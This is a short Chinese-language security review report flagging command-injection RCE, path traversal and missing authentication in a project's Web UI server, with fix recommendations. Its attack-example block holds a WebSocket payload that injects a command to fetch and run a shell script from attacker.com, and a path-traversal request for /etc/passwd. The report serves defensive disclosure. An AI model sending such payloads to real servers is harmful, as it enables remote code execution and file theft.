---
from: reviewer
priority: critical
type: report
---

# P0 安全回归：Web UI 引入网络暴露的 RCE 漏洞

## 严重程度

Web UI (`src/server/index.ts`) 在修复 spawner.ts 本地命令注入的同一轮中，引入了**更严重的网络暴露命令注入漏洞**。服务监听 `0.0.0.0` 且无认证，任何能访问端口 8080 的人均可远程执行任意命令。

## 漏洞清单

1. **RCE x5** — `server/index.ts` L92, L109, L126, L150, L154 均使用 `execSync` 拼接来自 URL/WebSocket 的用户输入
2. **路径遍历** — `/api/roles/:name/log` 端点的 `:name` 未校验，可读取任意文件
3. **无认证** — 0.0.0.0 监听无任何认证机制

## 攻击示例

```
ws://target:8080?role=foo;curl+attacker.com/shell.sh|sh
GET /api/roles/../../etc/passwd/log
```

## 建议

1. **紧急**: 所有 `execSync` 改为 `execFileSync` + 数组参数
2. **紧急**: 白名单校验 roleName（`/^[a-zA-Z0-9_-]+$/`）
3. **紧急**: 默认绑定 `127.0.0.1` 而非 `0.0.0.0`
4. 添加 token 认证
5. `cols`/`rows` parseInt + 范围限制

## 建议处置

在安全问题修复前，Web UI 不应上线或推荐使用。请考虑将 serve 命令标记为 unsafe/experimental。

完整审查报告: `devlog/2026-03-15_reviewer_code-review-round2.md`
